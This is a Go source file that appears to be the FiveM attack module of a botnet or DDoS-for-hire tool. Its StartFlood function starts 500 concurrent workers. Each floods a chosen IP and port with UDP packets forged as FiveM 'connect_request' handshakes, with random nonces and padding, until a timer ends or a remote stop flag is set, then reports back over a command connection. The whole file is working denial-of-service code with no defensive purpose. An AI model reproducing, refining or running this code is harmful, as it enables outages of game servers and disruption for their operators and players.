package fivem

import (
	"fmt"
	"math/rand"
	"net"
	"sync"
	"time"

	"go_net/pkg/core"
)

func StartFlood(targetIP string, port int, durationSecs int, conn net.Conn) {
	targetAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetIP, port))
	if err != nil {
		core.SendResponse(conn, fmt.Sprintf("ERROR: Could not resolve target address: %v", err))
		return
	}

	endTime := time.Now().Add(time.Duration(durationSecs) * time.Second)

	var wg sync.WaitGroup
	numWorkers := 500

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			udpConn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				return
			}
			defer udpConn.Close()

			r := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

			allocBuf := make([]byte, 128)

			for time.Now().Before(endTime) {
				if core.GetAttackStop() {
					return
				}

				for j := 0; j < 100; j++ {
					allocBuf[0], allocBuf[1], allocBuf[2], allocBuf[3] = 0xFF, 0xFF, 0xFF, 0xFF
					// again, idk if ts works.
					copy(allocBuf[4:], "connect_request ")

					nonce := r.Uint32()
					const hex = "0123456789abcdef"
					for k := 0; k < 8; k++ {
						allocBuf[20+k] = hex[(nonce>>(28-4*k))&0xF]
					}

					proto := 1 + (j % 30)

					allocBuf[28] = ' '
					var payloadLen int
					if proto < 10 {
						allocBuf[29] = byte('0' + proto)
						payloadLen = 30
					} else {
						allocBuf[29] = byte('0' + (proto / 10))
						allocBuf[30] = byte('0' + (proto % 10))
						payloadLen = 31
					}

					if j%10 == 0 {
						paddingLen := r.Intn(16)
						for k := 0; k < paddingLen; k++ {
							allocBuf[payloadLen+k] = byte(r.Intn(256))
						}
						udpConn.WriteTo(allocBuf[:payloadLen+paddingLen], targetAddr)
					} else {
						udpConn.WriteTo(allocBuf[:payloadLen], targetAddr)
					}
				}
			}
		}(i)
	}
	wg.Wait()
	core.SendResponse(conn, fmt.Sprintf("INFO: FiveM Flood on %s completed.", targetAddr))
}
